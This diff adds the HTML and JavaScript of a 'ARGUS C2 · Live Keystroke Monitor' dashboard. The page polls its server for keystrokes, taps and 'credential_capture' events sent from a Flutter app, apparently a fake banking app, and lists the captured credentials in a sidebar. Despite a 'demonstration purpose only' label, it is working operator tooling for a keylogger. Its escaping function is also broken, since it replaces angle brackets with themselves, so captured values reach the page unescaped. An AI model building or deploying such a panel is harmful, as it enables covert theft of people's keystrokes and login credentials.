@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ARGUS C2 · Live Keystroke Monitor</title>
+<style>
+  :root {
+    --bg: #0b0e14;
+    --surface: #141821;
+    --border: #1e2433;
+    --text: #cdd6f4;
+    --text-dim: #6c7086;
+    --red: #f38ba8;
+    --green: #a6e3a1;
+    --yellow: #f9e2af;
+    --blue: #89b4fa;
+    --mauve: #cba6f7;
+    --cyan: #89dceb;
+    --teal: #94e2d5;
+  }
+
+  * { margin:0; padding:0; box-sizing:border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'JetBrains Mono', 'Fira Code', 'Cascadia Code', monospace;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+  }
+
+  /* ── Header ─────────────────────────────────────────── */
+  header {
+    background: var(--surface);
+    border-bottom: 1px solid var(--border);
+    padding: 16px 24px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 12px;
+  }
+  header h1 {
+    font-size: 18px;
+    font-weight: 700;
+    color: var(--cyan);
+    letter-spacing: 0.5px;
+  }
+  header .subtitle {
+    font-size: 11px;
+    color: var(--text-dim);
+    letter-spacing: 1px;
+    text-transform: uppercase;
+  }
+  .status-dot {
+    display: inline-block;
+    width: 8px; height: 8px;
+    border-radius: 50%;
+    background: var(--green);
+    margin-right: 6px;
+    animation: pulse 2s infinite;
+  }
+  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.4} }
+  .status-offline { background: var(--red); animation: none; }
+
+  /* ── Stats bar ──────────────────────────────────────── */
+  .stats {
+    display: flex;
+    gap: 16px;
+    padding: 12px 24px;
+    background: var(--surface);
+    border-bottom: 1px solid var(--border);
+    flex-wrap: wrap;
+  }
+  .stat {
+    text-align: center;
+    min-width: 80px;
+  }
+  .stat .num {
+    font-size: 22px;
+    font-weight: 700;
+    color: var(--cyan);
+  }
+  .stat .label {
+    font-size: 10px;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+
+  /* ── Main layout ────────────────────────────────────── */
+  main {
+    flex: 1;
+    display: grid;
+    grid-template-columns: 1fr 340px;
+    gap: 0;
+    overflow: hidden;
+  }
+  @media (max-width: 800px) {
+    main { grid-template-columns: 1fr; grid-template-rows: 1fr auto; }
+    .sidebar { max-height: 300px; }
+  }
+
+  /* ── Event feed ─────────────────────────────────────── */
+  .feed {
+    overflow-y: auto;
+    padding: 0;
+    max-height: calc(100vh - 160px);
+  }
+  .event-row {
+    display: flex;
+    align-items: flex-start;
+    gap: 10px;
+    padding: 8px 24px;
+    border-bottom: 1px solid rgba(255,255,255,0.03);
+    font-size: 12px;
+    line-height: 1.5;
+    transition: background 0.15s;
+  }
+  .event-row:hover { background: rgba(255,255,255,0.02); }
+  .event-row:first-child { border-top: none; }
+  .event-row .ts {
+    color: var(--text-dim);
+    white-space: nowrap;
+    min-width: 75px;
+    font-size: 11px;
+  }
+  .event-row .badge {
+    display: inline-block;
+    padding: 1px 8px;
+    border-radius: 3px;
+    font-size: 10px;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+    white-space: nowrap;
+    min-width: 72px;
+    text-align: center;
+  }
+  .badge-key      { background: rgba(166,227,161,0.15); color: var(--green); }
+  .badge-click    { background: rgba(249,226,175,0.15); color: var(--yellow); }
+  .badge-submit   { background: rgba(203,166,247,0.15); color: var(--mauve); }
+  .badge-session  { background: rgba(137,220,235,0.15); color: var(--cyan); }
+  .badge-cred     { background: rgba(243,139,168,0.20); color: var(--red); }
+  .event-row .detail { flex:1; word-break: break-all; }
+
+  /* ── Sidebar — credentials ──────────────────────────── */
+  .sidebar {
+    background: var(--surface);
+    border-left: 1px solid var(--border);
+    padding: 20px;
+    overflow-y: auto;
+  }
+  .sidebar h2 {
+    font-size: 13px;
+    color: var(--red);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin-bottom: 16px;
+    padding-bottom: 8px;
+    border-bottom: 1px solid var(--border);
+  }
+  .cred-card {
+    background: rgba(243,139,168,0.06);
+    border: 1px solid rgba(243,139,168,0.2);
+    border-radius: 8px;
+    padding: 12px;
+    margin-bottom: 10px;
+  }
+  .cred-card .field-name {
+    font-size: 10px;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+    margin-bottom: 4px;
+  }
+  .cred-card .field-value {
+    font-size: 14px;
+    font-weight: 600;
+    color: var(--red);
+    word-break: break-all;
+    font-family: 'JetBrains Mono', monospace;
+  }
+  .empty-state {
+    text-align: center;
+    color: var(--text-dim);
+    font-size: 12px;
+    padding: 40px 0;
+    font-style: italic;
+  }
+
+  /* ── Buttons ────────────────────────────────────────── */
+  .btn {
+    background: var(--border);
+    color: var(--text);
+    border: 1px solid var(--border);
+    padding: 6px 14px;
+    border-radius: 4px;
+    cursor: pointer;
+    font-family: inherit;
+    font-size: 11px;
+    transition: 0.15s;
+  }
+  .btn:hover { background: #2a3040; }
+  .btn-danger { color: var(--red); border-color: rgba(243,139,168,0.3); }
+  .btn-danger:hover { background: rgba(243,139,168,0.1); }
+
+  /* ── Scrollbar ──────────────────────────────────────── */
+  ::-webkit-scrollbar { width: 5px; }
+  ::-webkit-scrollbar-track { background: transparent; }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+
+  /* ── Flash animation for new rows ───────────────────── */
+  .flash { animation: flash-bg 0.8s ease-out; }
+  @keyframes flash-bg { from { background: rgba(137,220,235,0.12); } to { background: transparent; } }
+</style>
+</head>
+<body>
+
+<header>
+  <div>
+    <h1><span class="status-dot" id="dot"></span> ARGUS C2 · Live Keystroke Monitor</h1>
+    <div class="subtitle">DEMONSTRATION PURPOSE ONLY · demobankfake research platform</div>
+  </div>
+  <div style="display:flex;gap:8px;align-items:center;">
+    <span id="pollStatus" style="font-size:11px;color:var(--text-dim)">● polling</span>
+    <button class="btn btn-danger" onclick="clearEvents()">Clear All</button>
+  </div>
+</header>
+
+<div class="stats">
+  <div class="stat"><div class="num" id="statTotal">0</div><div class="label">Total Events</div></div>
+  <div class="stat"><div class="num" id="statKeys">0</div><div class="label">Keystrokes</div></div>
+  <div class="stat"><div class="num" id="statClicks">0</div><div class="label">Button Clicks</div></div>
+  <div class="stat"><div class="num" id="statSessions">0</div><div class="label">Sessions</div></div>
+  <div class="stat"><div class="num" id="statCreds">0</div><div class="label">Credentials</div></div>
+</div>
+
+<main>
+  <div class="feed" id="feed">
+    <div class="empty-state" id="emptyFeed">Waiting for events from the Flutter app…<br><small style="opacity:0.6">Start the app and type in any field</small></div>
+  </div>
+
+  <aside class="sidebar">
+    <h2>📋 Captured Credentials</h2>
+    <div id="credsPanel">
+      <div class="empty-state" id="emptyCreds">No credentials captured yet.<br><small style="opacity:0.6">Credentials will appear here after login</small></div>
+    </div>
+  </aside>
+</main>
+
+<script>
+  const POLL_INTERVAL = 1200; // ms between polls
+  let lastTs = '';
+  let stats = { total:0, keys:0, clicks:0, sessions:0, creds:0 };
+  let knownCreds = {};
+
+  const badgeMap = {
+    keystroke:        ['KEY',    'badge-key'],
+    button_click:     ['CLICK',  'badge-click'],
+    field_submit:     ['SUBMIT', 'badge-submit'],
+    session_start:    ['SESSION','badge-session'],
+    credential_capture:['CRED',  'badge-cred'],
+  };
+
+  function fmtTime(ts) {
+    try { const d = new Date(ts); return d.toLocaleTimeString('en-GB', {hour12:false}); }
+    catch { return ts?.slice(11,19) || '--:--:--'; }
+  }
+
+  function badgeHtml(type) {
+    const [label, cls] = badgeMap[type] || ['?', 'badge-key'];
+    return `<span class="badge ${cls}">${label}</span>`;
+  }
+
+  function detailHtml(ev) {
+    switch(ev.type) {
+      case 'keystroke':
+        return `<span style="color:var(--text-dim)">${esc(ev.field)}</span> → <span style="color:var(--green)">'${esc(ev.value)}'</span>`;
+      case 'button_click':
+        return `<span style="color:var(--yellow)">Tapped: <b>${esc(ev.label)}</b></span>`;
+      case 'field_submit':
+        return `<span style="color:var(--mauve)">${esc(ev.field)} submitted → '${esc(ev.value)}'</span>`;
+      case 'session_start':
+        return `<span style="color:var(--cyan)">Device <b>${esc(ev.device_id)}</b></span>`;
+      case 'credential_capture':
+        return `<span style="color:var(--red)"><b>${esc(ev.field)}</b> = <span style="background:rgba(243,139,168,0.15);padding:1px 6px;border-radius:3px;">'${esc(ev.value)}'</span></span>`;
+      default:
+        return JSON.stringify(ev);
+    }
+  }
+
+  function esc(s) { return String(s||'').replace(/&/g,'&amp;').replace(/</g,'<').replace(/>/g,'>'); }
+
+  function updateStats(newEvents) {
+    for (const ev of newEvents) {
+      stats.total++;
+      if (ev.type === 'keystroke') stats.keys++;
+      if (ev.type === 'button_click') stats.clicks++;
+      if (ev.type === 'session_start') stats.sessions++;
+      if (ev.type === 'credential_capture') stats.creds++;
+    }
+    document.getElementById('statTotal').textContent = stats.total;
+    document.getElementById('statKeys').textContent = stats.keys;
+    document.getElementById('statClicks').textContent = stats.clicks;
+    document.getElementById('statSessions').textContent = stats.sessions;
+    document.getElementById('statCreds').textContent = stats.creds;
+  }
+
+  function updateCreds(creds) {
+    const panel = document.getElementById('credsPanel');
+    const keys = Object.keys(creds);
+    if (keys.length === 0) {
+      panel.innerHTML = '<div class="empty-state" id="emptyCreds">No credentials captured yet.</div>';
+    } else {
+      panel.innerHTML = keys.map(k =>
+        `<div class="cred-card">
+          <div class="field-name">${esc(k)}</div>
+          <div class="field-value">${esc(creds[k])}</div>
+        </div>`
+      ).join('');
+    }
+  }
+
+  function renderEvents(newEvents) {
+    if (newEvents.length === 0) return;
+    const feed = document.getElementById('feed');
+    // Remove empty state if present
+    const emptyEl = document.getElementById('emptyFeed');
+    if (emptyEl) emptyEl.remove();
+
+    const fragment = document.createDocumentFragment();
+    for (const ev of newEvents) {
+      const row = document.createElement('div');
+      row.className = 'event-row flash';
+      row.innerHTML = `
+        <span class="ts">${fmtTime(ev.ts)}</span>
+        ${badgeHtml(ev.type)}
+        <span class="detail">${screenTag(ev)} ${detailHtml(ev)}</span>`;
+      fragment.appendChild(row);
+    }
+    feed.insertBefore(fragment, feed.firstChild);
+
+    // Keep only the last 300 rows in the DOM.
+    while (feed.children.length > 300) feed.lastChild.remove();
+  }
+
+  function screenTag(ev) {
+    const s = esc(ev.screen || '');
+    if (!s) return '';
+    return `<span style="color:var(--text-dim);font-size:10px;background:var(--border);padding:1px 5px;border-radius:2px;margin-right:4px;">${s}</span>`;
+  }
+
+  async function poll() {
+    const dot = document.getElementById('dot');
+    const status = document.getElementById('pollStatus');
+    try {
+      const url = lastTs ? `/api/events?since=${encodeURIComponent(lastTs)}` : '/api/events';
+      const resp = await fetch(url);
+      if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
+      const data = await resp.json();
+
+      dot.className = 'status-dot';
+      status.textContent = '● live';
+      status.style.color = 'var(--green)';
+
+      const freshEvents = data.events || [];
+      if (freshEvents.length > 0) {
+        renderEvents(freshEvents);
+        updateStats(freshEvents);
+        lastTs = freshEvents[freshEvents.length - 1].ts || lastTs;
+      }
+      updateCreds(data.credentials || {});
+    } catch (e) {
+      dot.className = 'status-dot status-offline';
+      status.textContent = '● offline';
+      status.style.color = 'var(--red)';
+      console.error('Poll error:', e);
+    }
+  }
+
+  async function clearEvents() {
+    await fetch('/api/clear', { method: 'POST' });
+    document.getElementById('feed').innerHTML =
+      '<div class="empty-state" id="emptyFeed">Cleared. Waiting for new events…</div>';
+    document.getElementById('credsPanel').innerHTML =
+      '<div class="empty-state">No credentials captured yet.</div>';
+    lastTs = '';
+    stats = { total:0, keys:0, clicks:0, sessions:0, creds:0 };
+    updateStats([]);
+    knownCreds = {};
+  }
+
+  // Initial poll + start interval
+  poll();
+  setInterval(poll, POLL_INTERVAL);
+</script>
+</body>
+</html>
